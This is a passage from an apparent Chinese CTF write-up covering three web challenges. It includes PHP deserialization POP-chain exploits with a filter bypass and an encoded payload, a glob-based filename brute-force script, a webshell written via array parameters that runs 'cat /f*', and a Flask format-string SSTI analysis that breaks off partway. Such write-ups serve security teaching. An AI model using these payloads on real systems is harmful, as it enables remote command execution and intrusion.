class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">show_source</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Hacker</span></span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$exp</span>;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$cmd</span>;<br><br>    <span class="hljs-keyword">public</span>  <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-title function_ invoke__">call_user_func</span>(<span class="hljs-string">&#x27;system&#x27;</span>, <span class="hljs-string">&quot;cat /flag&quot;</span>);<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">A</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$hacker</span>;<br>    <span class="hljs-keyword">public</span>  <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable language_">$this</span>-&gt;hacker-&gt;name;<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;&quot;</span>;<br>    &#125;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">C</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$finish</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__get</span>(<span class="hljs-params"><span class="hljs-variable">$value</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;finish-&gt;<span class="hljs-title function_ invoke__">hacker</span>();<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;nonono&#x27;</span>;<br>    &#125;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">E</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$hacker</span>;<br><br>    <span class="hljs-keyword">public</span>  <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__invoke</span>(<span class="hljs-params"><span class="hljs-variable">$parms1</span></span>)</span><br><span class="hljs-function">    </span>&#123;   <br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable">$parms1</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;hacker-&gt;<span class="hljs-title function_ invoke__">welcome</span>();<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">H</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$username</span>=<span class="hljs-string">&quot;admin&quot;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">welcome</span>();<br><br>    &#125;<br>    <span class="hljs-keyword">public</span>  <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">welcome</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;welcome~ &quot;</span>.<span class="hljs-variable language_">$this</span>-&gt;username;<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">K</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$func</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__call</span>(<span class="hljs-params"><span class="hljs-variable">$method</span>,<span class="hljs-variable">$args</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-title function_ invoke__">call_user_func</span>(<span class="hljs-variable">$this</span>-&gt;func,<span class="hljs-string">&#x27;welcome&#x27;</span>);<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">R</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$method</span>;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$args</span>;<br><br>    <span class="hljs-keyword">public</span>  <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">welcome</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">$this</span>-&gt;key === <span class="hljs-literal">true</span> &amp;&amp; <span class="hljs-variable language_">$this</span>-&gt;finish1-&gt;name) &#123;<br>            <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">$this</span>-&gt;finish-&gt;finish) &#123;<br>                <span class="hljs-title function_ invoke__">call_user_func_array</span>(<span class="hljs-variable">$this</span>-&gt;method,<span class="hljs-variable">$this</span>-&gt;args);<br>            &#125;<br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">nonono</span>(<span class="hljs-params"><span class="hljs-variable">$a</span></span>)</span>&#123;<br>    <span class="hljs-variable">$filter</span> = <span class="hljs-string">&quot;/system|exec|passthru|shell_exec|popen|proc_open|pcntl_exec|system|eval|flag/i&quot;</span>;<br>    <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-variable">$filter</span>,<span class="hljs-string">&#x27;&#x27;</span>,<span class="hljs-variable">$a</span>);<br>&#125;<br><br><span class="hljs-variable">$a</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&quot;pop&quot;</span>];<br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$a</span>))&#123;<br>    <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-title function_ invoke__">nonono</span>(<span class="hljs-variable">$a</span>));<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>非预期</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs PHP"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Hacker</span></span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$exp</span>;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$cmd</span>;<br><br>    <span class="hljs-keyword">public</span>  <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-title function_ invoke__">call_user_func</span>(<span class="hljs-string">&#x27;system&#x27;</span>, <span class="hljs-string">&quot;cat /flag&quot;</span>);<br>    &#125;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">H</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$username</span>=<span class="hljs-string">&quot;admin&quot;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">welcome</span>();<br><br>    &#125;<br>    <span class="hljs-keyword">public</span>  <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">welcome</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;welcome~ &quot;</span>.<span class="hljs-variable language_">$this</span>-&gt;username;<br>    &#125;<br>&#125;<br><span class="hljs-comment">// pop</span><br><span class="hljs-comment">// H::welcome  $username</span><br><span class="hljs-comment">// Hacker::__toString</span><br><span class="hljs-variable">$aaa</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">H</span>();<br><span class="hljs-variable">$aaa</span>-&gt;username = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Hacker</span>();<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">urlencode</span>(<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$aaa</span>));<br></code></pre></td></tr></table></figure><p>预期</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><code class="hljs PHP"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">A</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$hacker</span>;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">C</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$finish</span>;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">E</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$hacker</span>;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">H</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$username</span>=<span class="hljs-string">&quot;admin&quot;</span>;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">K</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$func</span>;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">R</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$method</span>;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$args</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;key = <span class="hljs-literal">true</span>;<br>        @<span class="hljs-variable language_">$this</span>-&gt;finish1-&gt;name = <span class="hljs-literal">true</span>;<br>        @<span class="hljs-variable language_">$this</span>-&gt;finish-&gt;finish = <span class="hljs-literal">true</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;method = <span class="hljs-string">&#x27;system&#x27;</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;args = <span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;whoami&quot;</span>);<br>    &#125;<br>&#125;<br><span class="hljs-comment">// pop</span><br><span class="hljs-comment">// H::__destruct   $username</span><br><span class="hljs-comment">// A::__toString   $hacker</span><br><span class="hljs-comment">// C::__get        $finish</span><br><span class="hljs-comment">// K::__call       $func</span><br><span class="hljs-comment">// E::__invoke     $hacker</span><br><span class="hljs-comment">// R::welcome</span><br><br><span class="hljs-variable">$aaa</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">H</span>();<br><span class="hljs-variable">$aaa</span>-&gt;username = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">A</span>();<br><span class="hljs-variable">$aaa</span>-&gt;username-&gt;hacker = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">C</span>();<br><span class="hljs-variable">$aaa</span>-&gt;username-&gt;hacker-&gt;finish = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">K</span>();<br><span class="hljs-variable">$aaa</span>-&gt;username-&gt;hacker-&gt;finish-&gt;func = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">E</span>();<br><span class="hljs-variable">$aaa</span>-&gt;username-&gt;hacker-&gt;finish-&gt;func-&gt;hacker = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">R</span>();<br><br><span class="hljs-variable">$aaa</span> = <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$aaa</span>);<br><span class="hljs-variable">$aaa</span> = <span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-string">&quot;/system/&quot;</span>, <span class="hljs-string">&quot;syssystemtem&quot;</span>, <span class="hljs-variable">$aaa</span>);<span class="hljs-comment">//用的preg_replace($filter,&#x27;&#x27;,$a);多加一个就行</span><br><br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">urlencode</span>(<span class="hljs-variable">$aaa</span>);<br><span class="hljs-comment">//O%3A1%3A%22H%22%3A1%3A%7Bs%3A8%3A%22username%22%3BO%3A1%3A%22A%22%3A1%3A%7Bs%3A6%3A%22hacker%22%3BO%3A1%3A%22C%22%3A1%3A%7Bs%3A6%3A%22finish%22%3BO%3A1%3A%22K%22%3A1%3A%7Bs%3A4%3A%22func%22%3BO%3A1%3A%22E%22%3A1%3A%7Bs%3A6%3A%22hacker%22%3BO%3A1%3A%22R%22%3A5%3A%7Bs%3A9%3A%22%00R%00method%22%3Bs%3A6%3A%22syssystemtem%22%3Bs%3A7%3A%22%00R%00args%22%3Ba%3A1%3A%7Bi%3A0%3Bs%3A6%3A%22whoami%22%3B%7Ds%3A3%3A%22key%22%3Bb%3A1%3Bs%3A7%3A%22finish1%22%3BO%3A8%3A%22stdClass%22%3A1%3A%7Bs%3A4%3A%22name%22%3Bb%3A1%3B%7Ds%3A6%3A%22finish%22%3BO%3A8%3A%22stdClass%22%3A1%3A%7Bs%3A6%3A%22finish%22%3Bb%3A1%3B%7D%7D%7D%7D%7D%7D%7D</span><br></code></pre></td></tr></table></figure><p><img src="/../img/2023%E9%B9%8F%E5%9F%8E%E6%9D%AF/169923146057815.png" alt="img"></p><h2 id="web2"><a href="#web2" class="headerlink" title="web2"></a>web2</h2><p>前端有个scandir功能，输入目录，如果有此目录返回<code>yesyesyes!!!</code>，没有此目录返回<code>nonono~~~</code></p><p>如下</p><p><img src="/../img/2023%E9%B9%8F%E5%9F%8E%E6%9D%AF/16992314605611.png" alt="img"></p><p>前端看到有个后门文件，但是如果单纯爆破文件名要16的16次方，显然不可能</p><p><img src="/../img/2023%E9%B9%8F%E5%9F%8E%E6%9D%AF/16992314605612.png" alt="img"></p><p>利用glob协议，匹配地找php，这样最多只要匹配16*16次即可得到文件名</p><p><img src="/../img/2023%E9%B9%8F%E5%9F%8E%E6%9D%AF/16992314605613.png" alt="img"></p><p>借用<a href="https://www.yuque.com/dat0u/ctf/gupiindgyz7vodib#Duoup">lxxxin</a>师傅的wp</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs PHP">import requests<br><br>url = <span class="hljs-string">&quot;http://172.10.0.5/&quot;</span><br><br>s = <span class="hljs-string">&quot;0123456789abcdef&quot;</span><br>filename = <span class="hljs-string">&quot;glob:///var/www/html/backdoor_&quot;</span><br><br><span class="hljs-keyword">for</span> i in <span class="hljs-title function_ invoke__">range</span>(<span class="hljs-number">50</span>):<br>    <span class="hljs-keyword">for</span> j in s:<br>        temp = filename + j + <span class="hljs-string">&quot;*.php&quot;</span><br>        data = &#123;<br>            <span class="hljs-string">&quot;filename&quot;</span>: temp<br>        &#125;<br>        r = requests.<span class="hljs-title function_ invoke__">post</span>(url, data=data)<br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;yes&quot;</span> in r.text:<br>            filename += j<br>            <span class="hljs-keyword">print</span>(filename + <span class="hljs-string">&quot;.php&quot;</span>)<br>            <span class="hljs-keyword">break</span><br><span class="hljs-comment"># glob:///var/www/html/backdoor_00fbc51dcdf9eef767597fd26119a894.php</span><br></code></pre></td></tr></table></figure><p>backdoor_00fbc51dcdf9eef767597fd26119a894.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs PHP"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;username&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$sandbox</span> = <span class="hljs-string">&#x27;/var/www/html/sandbox/&#x27;</span>.<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-string">&quot;5050f6511ffb64e1914be4ca8b9d585c&quot;</span>.<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;username&#x27;</span>]).<span class="hljs-string">&#x27;/&#x27;</span>;<br>    <span class="hljs-title function_ invoke__">mkdir</span>(<span class="hljs-variable">$sandbox</span>);<br>    <span class="hljs-title function_ invoke__">chdir</span>(<span class="hljs-variable">$sandbox</span>);<br>    <br>    <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;title&#x27;</span>])&amp;&amp;<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;data&#x27;</span>]))&#123;<br>        <span class="hljs-variable">$data</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;data&#x27;</span>];<br>        <span class="hljs-variable">$title</span>= <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;title&#x27;</span>];<br>        <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$data</span>)&gt;<span class="hljs-number">5</span>||<span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$title</span>)&gt;<span class="hljs-number">3</span>)&#123;<br>            <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;no!no!no!&quot;</span>);<br>        &#125;<br>        <span class="hljs-title function_ invoke__">file_put_contents</span>(<span class="hljs-variable">$sandbox</span>.<span class="hljs-variable">$title</span>,<span class="hljs-variable">$data</span>);<br><br>        <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$title</span>)) &lt;= <span class="hljs-number">10</span>) &#123;<br>            <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-string">&#x27;php &#x27;</span>.<span class="hljs-variable">$sandbox</span>.<span class="hljs-variable">$title</span>);<br>        &#125;<br>        <span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-string">&#x27;rm &#x27;</span>.<span class="hljs-variable">$sandbox</span>.<span class="hljs-variable">$title</span>);<br>            <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;no!no!no!&quot;</span>);<br>        &#125;<br><br>    &#125;<br>    <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;reset&#x27;</span>])) &#123;<br>        <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-string">&#x27;/bin/rm -rf &#x27;</span> . <span class="hljs-variable">$sandbox</span>);<br>    &#125;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>数组绕过</p><p><img src="/../img/2023%E9%B9%8F%E5%9F%8E%E6%9D%AF/16992314605614.png" alt="img"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">/backdoor_00fbc51dcdf9eef767597fd26119a894.php?username=datou&amp;title[]=<span class="hljs-number">1</span>&amp;data[]=<span class="hljs-meta">&lt;?php</span> <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-string">&quot;cat /f*&quot;</span>);<span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p><code>file_put_contents($sandbox.$title,$data);</code>将data写入<code>$sandbox.$title</code><br><code>system(&#39;php &#39;.$sandbox.$title);</code>执行<code>$sandbox.$title</code></p><p>(复现的话发现好像写不进去文件)</p><h2 id="Escape"><a href="#Escape" class="headerlink" title="Escape"></a>Escape</h2><p>源码如下</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><code class="hljs Bash">from sqlite3 import *<br><br>from random import choice<br>from hashlib import sha512<br><br>from flask import Flask, request, Response<br>from flask_limiter import Limiter<br>from flask_limiter.util import get_remote_address<br><br>app = Flask(__name__)<br>limiter = Limiter(<br>    app=app,<br>    key_func=get_remote_address,<br>    default_limits=[<span class="hljs-string">&quot;50000 per hour&quot;</span>],<br>    storage_uri=<span class="hljs-string">&quot;memory://&quot;</span>,<br>)<br><br>salt = b<span class="hljs-string">&#x27;****************&#x27;</span><br><br>class PassHash(str):<br>    def __str__(self):<br>        <span class="hljs-built_in">return</span> sha512(salt + self.encode()).hexdigest()<br><br>    def __repr__(self):<br>        <span class="hljs-built_in">return</span> sha512(salt + self.encode()).hexdigest()<br><br>con = connect(<span class="hljs-string">&quot;users.db&quot;</span>)<br>cur = con.cursor()<br>cur.execute(<span class="hljs-string">&quot;DROP TABLE IF EXISTS users&quot;</span>)<br>cur.execute(<span class="hljs-string">&quot;CREATE TABLE users(username, passhash)&quot;</span>)<br>passhash = PassHash(<span class="hljs-string">&#x27;&#x27;</span>.<span class="hljs-built_in">join</span>(choice(<span class="hljs-string">&quot;0123456789&quot;</span>) <span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> range(16)))<br>cur.execute(<br>    <span class="hljs-string">&quot;INSERT INTO users VALUES (?, ?)&quot;</span>,<br>    (<span class="hljs-string">&quot;admin&quot;</span>, str(passhash))<br>)<br>con.commit()<br><br>@app.route(<span class="hljs-string">&#x27;/source&#x27;</span>)<br>@limiter.limit(<span class="hljs-string">&quot;1/second&quot;</span>)<br>def <span class="hljs-built_in">source</span>():<br>    <span class="hljs-built_in">return</span> Response(open(__file__).<span class="hljs-built_in">read</span>(), mimetype=<span class="hljs-string">&quot;text/plain&quot;</span>)<br><br>@app.route(<span class="hljs-string">&#x27;/&#x27;</span>)<br>@limiter.limit(<span class="hljs-string">&quot;3/second&quot;</span>)<br>def index():<br>    <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;username&#x27;</span> not <span class="hljs-keyword">in</span> request.args or <span class="hljs-string">&#x27;password&#x27;</span> not <span class="hljs-keyword">in</span> request.args:<br>        <span class="hljs-built_in">return</span> open(<span class="hljs-string">&quot;index.html&quot;</span>).<span class="hljs-built_in">read</span>()<br>    <span class="hljs-keyword">else</span>:<br>        username = request.args[<span class="hljs-string">&quot;username&quot;</span>]<br>        new_pwd = PassHash(request.args[<span class="hljs-string">&quot;password&quot;</span>])<br>        con = connect(<span class="hljs-string">&quot;users.db&quot;</span>)<br>        cur = con.cursor()<br>        res = cur.execute(<br>            <span class="hljs-string">&quot;SELECT * from users WHERE username = ? AND passhash = ?&quot;</span>,<br>            (username, str(new_pwd))<br>        )<br>        <span class="hljs-keyword">if</span> res.fetchone():<br>            <span class="hljs-built_in">return</span> open(<span class="hljs-string">&quot;secret.html&quot;</span>).<span class="hljs-built_in">read</span>()<br>        <span class="hljs-built_in">return</span> (<span class="hljs-string">&quot;Sorry, we couldn&#x27;t find a user &#x27;&#123;user&#125;&#x27; with password hash &lt;code&gt;&#123;&#123;passhash&#125;&#125;&lt;/code&gt;!&quot;</span><br>                .format(user=username)<br>                .format(passhash=new_pwd)<br>                )<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    app.run(<span class="hljs-string">&#x27;0.0.0.0&#x27;</span>, 10000)<br></code></pre></td></tr></table></figure><p>原题</p><p><img src="/../img/2023%E9%B9%8F%E5%9F%8E%E6%9D%AF/16992314605625.png" alt="img"></p><p>不熟悉ssti，但就看这个payload，结合ai和自己的见解简单分析一下（不一定对）</p><p>因为<code>passhash=PassHash(&#39;&#39;.join(choice(&quot;0123456789&quot;) for _ in range(16)))</code>，所以可以调用<code>__str__</code>方法</p><p><img src="/../img/2023%E9%B9%8F%E5%9F%8E%E6%9D%AF/16992314605626.png" alt="img"></p><p>然后获取全局<code>&#123;passhash.__str__.__globals__&#125;</code>，里面有app对象</p><p><img src="/../img/2023%E9%B9%8F%E5%9F%8E%E6%9D%AF/16992314605627.png" alt="img"></p><p>然后app内有个内置的<code>wsgi_app</code></p><p><img src="/../img/2023%E9%B9%8F%E5%9F%8E%E6%9D%AF/16992314605628.png" alt="img"></p><p><img src="/../img/2023%E9%B9%8F%E5%9F%8E%E6%9D%AF/16992314605639.png" alt="img"></p><p>可以看到有os、sys模块</p><p><img src="/../img/2023%E9%B9%8F%E5%9F%8E%E6%9D%AF/169923146056310.png" 